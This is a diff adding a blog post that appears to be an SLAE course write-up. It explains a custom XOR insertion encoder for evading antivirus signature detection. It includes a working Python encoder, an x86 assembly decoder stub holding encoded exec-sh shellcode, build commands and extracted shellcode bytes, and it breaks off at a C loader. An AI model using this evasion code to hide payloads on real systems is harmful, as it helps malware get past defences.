@@ -1,0 +1,386 @@
+<!doctype html><html lang=en><head>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta charset=utf-8>
+<meta content="utf-8" http-equiv=encoding>
+<link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin>
+<link rel=stylesheet href=/css/grid.css type=text/css>
+<link rel=stylesheet href=/css/highlight.css type=text/css>
+<link rel=stylesheet href=/css/main.css type=text/css>
+<meta name=apple-mobile-web-app-title content="dubell.io | SLAE 4: Custom encoder for bypassing signature based detection">
+<meta name=apple-mobile-web-app-capable content="yes">
+<meta name=apple-mobile-web-app-status-bar-style content="black-translucent">
+<meta name=twitter:site content="@dubs3c">
+<meta name=twitter:creator content="@dubs3c">
+<meta property="og:title" content="dubell.io | SLAE 4: Custom encoder for bypassing signature based detection">
+<meta name=twitter:title content="dubell.io | SLAE 4: Custom encoder for bypassing signature based detection">
+<meta itemprop=name content="dubell.io | SLAE 4: Custom encoder for bypassing signature based detection">
+<meta name=application-name content="dubell.io | SLAE 4: Custom encoder for bypassing signature based detection">
+<meta property="og:site_name" content="dubell.io">
+<meta property="og:article:published_time" content="2020-01-24T13:33:37Z">
+<meta property="article:published_time" content="2020-01-24T13:33:37Z">
+<base href=/www/slae-4-custom_encoder/>
+<link rel=canonical href=/www/slae-4-custom_encoder/ itemprop=url>
+<meta name=url content="/www/slae-4-custom_encoder/">
+<meta name=twitter:url content="/www/slae-4-custom_encoder/">
+<meta property="og:url" content="/www/slae-4-custom_encoder/">
+<meta property="og:article:author" content="Dubs3c">
+<meta property="article:author" content="Dubs3c">
+<meta name=author content="Dubs3c">
+<meta name=description content="Bypass signature detection with a custom encoder">
+<meta itemprop=description content="Bypass signature detection with a custom encoder">
+<meta property="og:description" content="Bypass signature detection with a custom encoder">
+<meta name=twitter:description content="Bypass signature detection with a custom encoder">
+<meta itemprop=image content="/img/hacker2.jpg">
+<meta property="og:image" content="/img/hacker2.jpg">
+<meta name=twitter:image content="/img/hacker2.jpg">
+<meta name=twitter:image:src content="/img/hacker2.jpg">
+<meta property="og:updated_time" content="2020-01-24T13:33:37Z">
+<link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml>
+<title>dubell.io | SLAE 4: Custom encoder for bypassing signature based detection</title>
+</head><body>
+<div id=particles-js></div>
+<main><div class=row>
+<header class="col center">
+<a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a>
+</div>
+</div>
+<div class=row>
+<div class="col center">
+<nav>
+<fieldset>
+<legend>n4vig4ti0n</legend>
+<ul>
+<li><a href=/>/etc/motd</a></li>
+<li><a href=/www/>/var/www</a></li>
+<li><a href=/mnt/>/mnt</a></li>
+<li><a href=/usr/>/usr</a></li>
+</ul>
+</fieldset>
+</nav>
+</div>
+</div>
+<div class=content>
+<article>
+<center><h1>SLAE 4: Custom encoder for bypassing signature based detection</h1>
+<br>
+<span class=small><strong>Date:</strong> 2020-01-24 </span>
+<span class=small><strong>Category:</strong> <a href=/categories/programming>Programming</a> </span>
+<span class=small><strong>Reading time:</strong> 5 minutes</span>
+<br><br>
+<p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a> </p>
+<br>
+<hr>
+</center>
+<br>
+<p>Malware detection techniques has improved a lot over the years. Today companies are investing in machine learning methods for detecting malware, which sounds pretty cool if you ask me. However, there is one method that has been used since the first anti-virus software, which is signature based detection.</p>
+<p>When disassembling a program you can analyze the assembly instructions in order to understand the program from the lowest level. It&rsquo;s also possible from the assembly code to identify a set of unique instructions that identifies a specific program. These unique instructions form the signature. The instructions can be anything that identifies a specific and unique behaviour in the program. An example could be a decryption routine that identifies a decryption stub used for decrypting shellcode.</p>
+<p>How do we bypass signature detections? Well, we change the signature. You either do this manually or you write an encoder which takes shellcode as input and outputs an encoded shellcode, which as zero known signatures for it. In this article, I will present a very easy and trivial encoding scheme for hiding from AVs :)</p>
+<h2 id=the-algorithm>The Algorithm</h2>
+<p>The scheme I have chosen is a simple insertion encoder with XOR twist. Given a piece of shellcode, the encoder will generate a random value K<sub>n</sub> between 1-255 for each shellcode byte S<sub>n</sub>. Each random value will be XORed with with each shellcode byte, like so: K<sub>1</sub> ^ S<sub>1</sub> = R<sub>1</sub>. The original shellcode will be modified to include the random value as a prefix for the now encoded shellcode byte. The final shellcode can be seen as:</p>
+<pre tabindex=0><code>[K1][R1][K2][R2][K3][R3]...[KN][RN]
+</code></pre><p>Even though it is a trivial obfuscation technique, it has some drawbacks:</p>
+<ul>
+<li>It will double the shellcode length</li>
+<li>Once the shellcode has been decoded, a bunch of garbage data will exist following the shellcode. This means that if your shellcode does not return, the garbage data will be executed which leads to a segfault.</li>
+</ul>
+<p>However, for demonstrating how bypassing signature detection can look like, this method will suffice.</p>
+<h2 id=the-encoder>The Encoder</h2>
+<p>I have chosen to write the encoder in Python because it&rsquo;s very easy to implement these kinds of scripts with it.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>sys</span>
+<span class=kn>import</span> <span class=nn>random</span>
+
+<span class=k>def</span> <span class=nf>encode</span><span class=p>(</span><span class=n>shellcode</span><span class=p>):</span>
+    <span class=s2>&#34;&#34;&#34;
+</span><span class=s2>    shellcode: string
+</span><span class=s2>
+</span><span class=s2>    returns: string
+</span><span class=s2>    &#34;&#34;&#34;</span>
+    <span class=n>shellcode_output</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+    <span class=n>shellcode_list</span> <span class=o>=</span> <span class=p>[]</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>shellcode</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>:]:</span>
+        <span class=n>xor_key</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>254</span><span class=p>)</span>
+        <span class=n>hex_key</span> <span class=o>=</span> <span class=nb>hex</span><span class=p>(</span><span class=n>xor_key</span><span class=p>)</span>
+        <span class=n>byte</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>i</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;x&#34;</span><span class=p>,</span> <span class=s2>&#34;0x&#34;</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
+        <span class=n>shellcode_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>hex_key</span><span class=p>)</span>
+        <span class=n>shellcode_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>xor_key</span> <span class=o>^</span> <span class=n>byte</span><span class=p>))</span>
+
+    <span class=k>return</span> <span class=s2>&#34;,&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>shellcode_list</span><span class=p>)</span>
+
+<span class=k>def</span> <span class=nf>decode</span><span class=p>(</span><span class=n>encoded_shellcode</span><span class=p>):</span>
+    <span class=s2>&#34;&#34;&#34;decode()
+</span><span class=s2>    encoded_shellcode: string
+</span><span class=s2>
+</span><span class=s2>    returns: string
+</span><span class=s2>    &#34;&#34;&#34;</span>
+    <span class=n>shellcode_list</span> <span class=o>=</span> <span class=n>encoded_shellcode</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;,&#34;</span><span class=p>)</span>
+    <span class=n>it</span> <span class=o>=</span> <span class=nb>iter</span><span class=p>(</span><span class=n>shellcode_list</span><span class=p>)</span>
+    <span class=n>decoded_shellcode</span> <span class=o>=</span> <span class=p>[]</span>
+    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>it</span><span class=p>:</span>
+        <span class=n>decoded_shellcode</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>^</span> <span class=nb>int</span><span class=p>(</span><span class=nb>next</span><span class=p>(</span><span class=n>it</span><span class=p>),</span> <span class=mi>16</span><span class=p>)))</span>
+    <span class=k>return</span> <span class=s2>&#34;,&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>decoded_shellcode</span><span class=p>)</span>
+
+<span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>shellcode</span><span class=p>):</span>
+    <span class=s2>&#34;&#34;&#34;main()
+</span><span class=s2>    shellcode: string
+</span><span class=s2>    &#34;&#34;&#34;</span>
+    <span class=n>orginal_shellcode</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span>
+    <span class=n>new_shellcode</span> <span class=o>=</span> <span class=n>encode</span><span class=p>(</span><span class=n>orginal_shellcode</span><span class=p>)</span>
+    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Your encoded shellcode: &#34;</span><span class=p>)</span>
+    <span class=nb>print</span><span class=p>(</span><span class=n>new_shellcode</span><span class=p>)</span>
+    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] Decoded shellcode:&#34;</span><span class=p>)</span>
+    <span class=n>decoded_shellcode</span> <span class=o>=</span> <span class=n>decode</span><span class=p>(</span><span class=n>new_shellcode</span><span class=p>)</span>
+    <span class=nb>print</span><span class=p>(</span><span class=n>decoded_shellcode</span><span class=p>)</span>
+    <span class=k>assert</span> <span class=n>decoded_shellcode</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;0x&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;,&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=n>orginal_shellcode</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x0&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x&#34;</span><span class=p>)</span>
+
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>:</span>
+        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: python3 wrapper.py &lt;shellcode&gt;&#34;</span><span class=p>)</span>
+        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+
+    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
+        <span class=n>main</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>To use the program, simply input your shellcode and receive the encoded version:</p>
+<pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ python3 wrapper.py &quot;\xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde&quot;
+[+] Your encoded shellcode:
+0x77,0x8b,0x4a,0xf1,0xdb,0xc0,0x5,0x94,0xe7,0x2a,0x43,0x8b,0x93,0x78,0x73,0x7f,0x38,0x66,0xe5,0xb3,0x14,0x25,0x2d,0x33,0x6b,0xc6,0xc5,0xc4,0x56,0x95,0x8d,0x8,0x2f,0xef,0xd,0x78,0x9f,0x68,0x7a,0xb9,0xd7,0x3f,0xf5,0x1a,0xba,0x45,0x2,0xfd,0x93,0x6c,0xe3,0xc9,0xee,0xad,0x93,0xc,0xb5,0x15,0xe3,0xc1,0xe,0x42,0xbd,0xee,0xf8,0xa1,0xaf,0x7d,0x65,0xd8,0x24,0x98,0x86,0x7d,0xb1,0xfa,0xf8,0xb3,0x96,0xb7,0x2a,0xe0,0x27,0x65,0x69,0x13,0x3a,0x5c,0x55,0xc8,0x1,0x5e,0x59,0xe9,0x7a,0x9c,0xd7,0x9,0xb2,0xed,0xc5,0x8f,0xd4,0x33,0xfa,0x24
+
+[+] Decoded shellcode:
+0xfc,0xbb,0x1b,0x91,0xcd,0xc8,0xeb,0xc,0x5e,0x56,0x31,0x1e,0xad,0x1,0xc3,0x85,0xc0,0x75,0xf7,0xc3,0xe8,0xef,0xff,0xff,0xff,0x2a,0x43,0x9f,0xa0,0x22,0x4c,0x53,0x59,0xd2,0xbd,0xbc,0xfb,0x4b,0x4b,0x21,0xca,0x42,0x7a,0x66,0x9d,0x5f,0xb0,0xe6,0xde,0x5f,0x4a,0xe7,0xde
+dubs3c@slae:~/SLAE/EXAM/github/assignment_4$
+</code></pre><p>The shellcode used in the example above is a simple <code>exec-sh</code> shellcode which will drop into an <code>sh</code> shell.</p>
+<h2 id=writing-the-decoder-stub>Writing the decoder stub</h2>
+<p>It&rsquo;s time to write the decoder stub. The following is a simple program for looping through the shellcode, XORing bytes and reconstructing the original shellcode.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=c>;-------------------------------------
+</span><span class=c>;
+</span><span class=c>; Author: dubs3c
+</span><span class=c>;
+</span><span class=c>; Purpose:
+</span><span class=c>; Insertion Encoder, hide from AV :)
+</span><span class=c>;
+</span><span class=c>;-------------------------------------
+</span><span class=c></span>
+<span class=nf>global</span> <span class=no>_start</span>
+
+<span class=nf>section</span> <span class=no>.text</span>
+<span class=nl>_start:</span>
+    <span class=nf>jmp</span> <span class=no>short</span> <span class=no>call_shellcode</span>        <span class=c>; jmp-call-pop method
+</span><span class=c></span>
+<span class=nl>decoder:</span>
+    <span class=nf>pop</span> <span class=no>esi</span>                         <span class=c>; Get the address of EncodedShellcode
+</span><span class=c></span>    <span class=no>lea</span> <span class=no>edi</span><span class=p>,</span> <span class=p>[</span><span class=no>esi</span> <span class=err>+</span> <span class=mi>1</span><span class=p>]</span>              <span class=c>; edi points to the next byte
+</span><span class=c></span>    <span class=no>xor</span> <span class=no>eax</span><span class=p>,</span> <span class=no>eax</span>                    <span class=c>; zero out register
+</span><span class=c></span>    <span class=no>xor</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>ebx</span>                    <span class=c>; zero out register
+</span><span class=c></span>    <span class=no>xor</span> <span class=no>edx</span><span class=p>,</span> <span class=no>edx</span>                    <span class=c>; zero out register
+</span><span class=c></span>    <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>                    <span class=c>; zero out register
+</span><span class=c></span>
+<span class=nl>decode:</span>
+    <span class=nf>mov</span> <span class=no>bl</span><span class=p>,</span> <span class=no>byte</span> <span class=p>[</span><span class=no>esi</span> <span class=err>+</span> <span class=no>eax</span><span class=p>]</span>        <span class=c>; Get the byte at esi + eax
+</span><span class=c></span>    <span class=no>xor</span> <span class=no>bl</span><span class=p>,</span> <span class=mi>0xaa</span>                    <span class=c>; XOR with 0xaa to check if we are at the end of the shellcode
+</span><span class=c></span>    <span class=no>jz</span> <span class=no>short</span> <span class=no>EncodedShellcode</span>       <span class=c>; If we are at the end, we are done, jump to shellcode
+</span><span class=c></span>    <span class=no>mov</span> <span class=no>dl</span><span class=p>,</span> <span class=no>byte</span> <span class=p>[</span><span class=no>esi</span> <span class=err>+</span> <span class=no>eax</span><span class=p>]</span>        <span class=c>; Get the byte at esi + eax
+</span><span class=c></span>    <span class=no>mov</span> <span class=no>bl</span><span class=p>,</span> <span class=no>byte</span> <span class=p>[</span><span class=no>esi</span> <span class=err>+</span> <span class=no>eax</span> <span class=err>+</span> <span class=mi>1</span><span class=p>]</span>    <span class=c>; Get the byte at esi + eax + 1
+</span><span class=c></span>    <span class=no>xor</span> <span class=no>dl</span><span class=p>,</span> <span class=no>bl</span>                      <span class=c>; XOR to get orignal shellcode byte
+</span><span class=c></span>    <span class=no>mov</span> <span class=no>byte</span> <span class=p>[</span><span class=no>esi</span> <span class=err>+</span> <span class=no>ecx</span><span class=p>],</span> <span class=no>dl</span>        <span class=c>; Overwrite EncodedShellcode at byte esi + ecx with the result
+</span><span class=c></span>    <span class=no>add</span> <span class=no>al</span><span class=p>,</span> <span class=mi>2</span>                       <span class=c>; Add 2 to eax to jump to the next pair of bytes
+</span><span class=c></span>    <span class=no>inc</span> <span class=no>ecx</span>                         <span class=c>; increment ecx which byte to overwrite in EncodedShellcode
+</span><span class=c></span>    <span class=no>jmp</span> <span class=no>short</span> <span class=no>decode</span>                <span class=c>; loop back to decode
+</span><span class=c></span>
+<span class=nl>call_shellcode:</span>
+    <span class=nf>call</span> <span class=no>decoder</span>
+    <span class=nl>EncodedShellcode:</span> <span class=nf>db</span> <span class=mi>0x1</span><span class=p>,</span><span class=mi>0xfd</span><span class=p>,</span><span class=mi>0xa2</span><span class=p>,</span><span class=mi>0x19</span><span class=p>,</span><span class=mi>0x60</span><span class=p>,</span><span class=mi>0x7b</span><span class=p>,</span><span class=mi>0x7d</span><span class=p>,</span><span class=mi>0xec</span><span class=p>,</span><span class=mi>0xac</span><span class=p>,</span><span class=mi>0x61</span><span class=p>,</span><span class=mi>0xac</span><span class=p>,</span><span class=mi>0x64</span><span class=p>,</span><span class=mi>0x31</span><span class=p>,</span><span class=mi>0xda</span><span class=p>,</span><span class=mi>0x2b</span><span class=p>,</span><span class=mi>0x27</span><span class=p>,</span><span class=mi>0xb1</span><span class=p>,</span><span class=mi>0xef</span><span class=p>,</span><span class=mi>0xd</span><span class=p>,</span><span class=mi>0x5b</span><span class=p>,</span><span class=mi>0x66</span><span class=p>,</span><span class=mi>0x57</span><span class=p>,</span><span class=mi>0xa5</span><span class=p>,</span><span class=mi>0xbb</span><span class=p>,</span><span class=mi>0xc7</span><span class=p>,</span><span class=mi>0x6a</span><span class=p>,</span><span class=mi>0xac</span><span class=p>,</span><span class=mi>0xad</span><span class=p>,</span><span class=mi>0x41</span><span class=p>,</span><span class=mi>0x82</span><span class=p>,</span><span class=mi>0x7a</span><span class=p>,</span><span class=mi>0xff</span><span class=p>,</span><span class=mi>0x5</span><span class=p>,</span><span class=mi>0xc5</span><span class=p>,</span><span class=mi>0xf4</span><span class=p>,</span><span class=mi>0x81</span><span class=p>,</span><span class=mi>0xf1</span><span class=p>,</span><span class=mi>0x6</span><span class=p>,</span><span class=mi>0x99</span><span class=p>,</span><span class=mi>0x5a</span><span class=p>,</span><span class=mi>0x54</span><span class=p>,</span><span class=mi>0xbc</span><span class=p>,</span><span class=mi>0xac</span><span class=p>,</span><span class=mi>0x43</span><span class=p>,</span><span class=mi>0x28</span><span class=p>,</span><span class=mi>0xd7</span><span class=p>,</span><span class=mi>0x4</span><span class=p>,</span><span class=mi>0xfb</span><span class=p>,</span><span class=mi>0x1b</span><span class=p>,</span><span class=mi>0xe4</span><span class=p>,</span><span class=mi>0x11</span><span class=p>,</span><span class=mi>0x3b</span><span class=p>,</span><span class=mi>0x35</span><span class=p>,</span><span class=mi>0x76</span><span class=p>,</span><span class=mi>0xdc</span><span class=p>,</span><span class=mi>0x43</span><span class=p>,</span><span class=mi>0x57</span><span class=p>,</span><span class=mi>0xf7</span><span class=p>,</span><span class=mi>0x4f</span><span class=p>,</span><span class=mi>0x6d</span><span class=p>,</span><span class=mi>0xe1</span><span class=p>,</span><span class=mi>0xad</span><span class=p>,</span><span class=mi>0xd7</span><span class=p>,</span><span class=mi>0x84</span><span class=p>,</span><span class=mi>0x6c</span><span class=p>,</span><span class=mi>0x35</span><span class=p>,</span><span class=mi>0x62</span><span class=p>,</span><span class=mi>0xb0</span><span class=p>,</span><span class=mi>0x7b</span><span class=p>,</span><span class=mi>0xc6</span><span class=p>,</span><span class=mi>0x7f</span><span class=p>,</span><span class=mi>0xc3</span><span class=p>,</span><span class=mi>0x80</span><span class=p>,</span><span class=mi>0x7b</span><span class=p>,</span><span class=mi>0x1f</span><span class=p>,</span><span class=mi>0x54</span><span class=p>,</span><span class=mi>0x45</span><span class=p>,</span><span class=mi>0xe</span><span class=p>,</span><span class=mi>0xa9</span><span class=p>,</span><span class=mi>0x88</span><span class=p>,</span><span class=mi>0x97</span><span class=p>,</span><span class=mi>0x5d</span><span class=p>,</span><span class=mi>0x84</span><span class=p>,</span><span class=mi>0xc6</span><span class=p>,</span><span class=mi>0xe9</span><span class=p>,</span><span class=mi>0x93</span><span class=p>,</span><span class=mi>0x6c</span><span class=p>,</span><span class=mi>0xa</span><span class=p>,</span><span class=mi>0x6f</span><span class=p>,</span><span class=mi>0xf2</span><span class=p>,</span><span class=mi>0x7a</span><span class=p>,</span><span class=mi>0x25</span><span class=p>,</span><span class=mi>0xe0</span><span class=p>,</span><span class=mi>0x50</span><span class=p>,</span><span class=mi>0x88</span><span class=p>,</span><span class=mi>0x6e</span><span class=p>,</span><span class=mi>0x3b</span><span class=p>,</span><span class=mi>0xe5</span><span class=p>,</span><span class=mi>0x56</span><span class=p>,</span><span class=mi>0x9</span><span class=p>,</span><span class=mi>0x6f</span><span class=p>,</span><span class=mi>0x25</span><span class=p>,</span><span class=mi>0xae</span><span class=p>,</span><span class=mi>0x49</span><span class=p>,</span><span class=mi>0xe3</span><span class=p>,</span><span class=mi>0x3d</span><span class=p>,</span><span class=mi>0xaa</span><span class=p>,</span><span class=mi>0xaa</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The program can be assembled with nasm:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>nasm -f elf32 -o build/ass4.o ass4.nasm
+ld -z execstack -N -o build/ass4 build/ass4.o
+</code></pre></td></tr></table>
+</div>
+</div><p>Because I have specified the <code>-N</code> option, the code section is now writable and we can run the executable.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ ./build/ass4
+$ whoami
+dubs3c
+$
+</code></pre></td></tr></table>
+</div>
+</div><p>We can also convert this program into shellcode and use it in e.g. a stager:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>dubs3c@slae:~/SLAE/EXAM/github/assignment_4$ objdump -d ./build/ass4<span class=p>|</span>grep <span class=s1>&#39;[0-9a-f]:&#39;</span><span class=p>|</span>grep -v <span class=s1>&#39;file&#39;</span><span class=p>|</span>cut -f2 -d:<span class=p>|</span>cut -f1-6 -d<span class=s1>&#39; &#39;</span><span class=p>|</span>tr -s <span class=s1>&#39; &#39;</span><span class=p>|</span>tr <span class=s1>&#39;\t&#39;</span> <span class=s1>&#39; &#39;</span><span class=p>|</span>sed <span class=s1>&#39;s/ $//g&#39;</span><span class=p>|</span>sed <span class=s1>&#39;s/ /\\x/g&#39;</span><span class=p>|</span>paste -d <span class=s1>&#39;&#39;</span> -s <span class=p>|</span>sed <span class=s1>&#39;s/^/&#34;/&#39;</span><span class=p>|</span>sed <span class=s1>&#39;s/$/&#34;/g&#39;</span>
+<span class=s2>&#34;\xeb\x25\x5e\x8d\x7e\x01\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x8a\x1c\x06\x80\xf3\xaa\x74\x16\x8a\x14\x06\x8a\x5c\x06\x01\x30\xda\x88\x14\x0e\x04\x02\x41\xeb\xe7\xe8\xd6\xff\xff\xff\x01\xfd\xa2\x19\x60\x7b\x7d\xec\xac\x61\xac\x64\x31\xda\x2b\x27\xb1\xef\x0d\x5b\x66\x57\xa5\xbb\xc7\x6a\xac\xad\x41\x82\x7a\xff\x05\xc5\xf4\x81\xf1\x06\x99\x5a\x54\xbc\xac\x43\x28\xd7\x04\xfb\x1b\xe4\x11\x3b\x35\x76\xdc\x43\x57\xf7\x4f\x6d\xe1\xad\xd7\x84\x6c\x35\x62\xb0\x7b\xc6\x7f\xc3\x80\x7b\x1f\x54\x45\x0e\xa9\x88\x97\x5d\x84\xc6\xe9\x93\x6c\x0a\x6f\xf2\x7a\x25\xe0\x50\x88\x6e\x3b\xe5\x56\x09\x6f\x25\xae\x49\xe3\x3d\xaa\xaa&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The shellcode could be embedded in a simple C program that will execute the decoder program, containing our <code>exec-sh</code> shellcode.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span><span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span><span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+
